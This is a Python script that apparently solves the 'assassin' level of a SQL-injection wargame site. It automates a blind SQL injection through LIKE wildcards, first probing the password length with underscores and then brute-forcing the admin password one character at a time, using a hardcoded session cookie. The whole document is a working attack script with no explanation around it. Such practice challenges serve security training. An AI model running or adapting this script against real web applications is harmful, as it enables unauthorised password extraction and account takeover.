'''
filter = '(single quote)
'''

import urllib.request
import string
from urllib.parse import quote # url encoding func

url = 'http://los.rubiya.kr/assassin_14a1fd552c61c60f034879e5d4171373.php?pw='
guest_result = ""
admin_result = ""
guest_pwlen = 0
admin_pwlen = 0
find_check = False
strings = string.digits + string.ascii_letters

__author__ = "goodasd123@naver.com - h4lo"

def req(query):
    re = urllib.request.Request(query)
    re.add_header('User-Agent', 'Mozilla/5.0')
    re.add_header('Cookie', 'PHPSESSID=mnkabf7sanmb7hgl4n1o82hqk0')
    res = urllib.request.urlopen(re)
    return res

for i in range(0, 10):
    add_url = '_' * i
    query = url + quote(add_url)

    if str(req(query).read()).find('Hello guest') != -1:
        guest_pwlen = i
        print("[Guest password length is {}!]".format(guest_pwlen))
    if str(req(query).read()).find('Hello admin') != -1:
        admin_pwlen = i
        print("[Admin password length is {}!]".format(admin_pwlen))
        find_check = True
        break
    else:
        print("Matching.. -> [{}]".format('_' * i))
if find_check != True:
    admin_pwlen = guest_pwlen
    print("[Admin password length is {}!]".format(admin_pwlen))
    find_check = False

for i in range(1, admin_pwlen + 1):
    for j in strings:
        find_check = False
        add_url = '{}%'.format(admin_result + j)
        query = url + quote(add_url)

        if str(req(query).read()).find('Hello admin') != -1:
            admin_result += j
            print("Admin Find!!")
            print("[Guest] : {}%".format(guest_result))
            print("[Admin] : {}%".format(admin_result))
            find_check = True
            break
        if str(req(query).read()).find('Hello guest') != -1:
            guest_result += j
            print("Guest Find!!")
            print("[Guest] : {}%".format(guest_result))
            print("[Admin] : {}%".format(admin_result))
        else:
            print("Matching.. -> [{}]".format(j))
    if find_check != True:
        admin_result = guest_result
        print("Admin = Guest")
        print("[Guest] : {}%".format(guest_result))
        print("[Admin] : {}%".format(admin_result))
    if admin_result != guest_result:
        print("Blind SQL Injection completed.")
        print("Password is {}%".format(admin_result))
        exit()

print("Blind SQL Injection completed.")
print("Password is {}".format(admin_result))
